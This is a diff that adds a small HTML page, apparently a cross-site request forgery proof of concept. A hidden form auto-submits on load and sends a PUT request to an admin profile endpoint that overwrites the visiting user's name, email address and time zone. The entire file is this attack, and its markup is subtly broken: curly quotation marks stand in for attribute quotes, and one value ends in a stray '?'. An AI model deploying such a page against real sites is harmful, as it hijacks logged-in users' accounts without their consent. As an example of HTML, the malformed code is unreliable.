@@ -1,0 +1,21 @@
+<html> <head>
+
+<title>test for csrf</title></head>
+
+<body> <form method=”POST” action=”https://admin.xyz.com/profile” name=”manish” >
+
+<input type=”hidden” name=”_method” value=”put” />
+
+<input type=”hidden” name=”user[first_name]” value=”Manish” />
+
+<input type=”hidden” name=”user[last_name]” value=”Bhattacharya” />
+
+<input type=”hidden” name=”user[email]” value=”xyz@gmail.com” />
+
+<input type=”hidden” name=”user[time_zone]” value=”Pacific+Time+%28US+%26+Canada%29? />
+
+</form> <script> document.manish.submit(); </script>
+
+</body>
+
+</html>
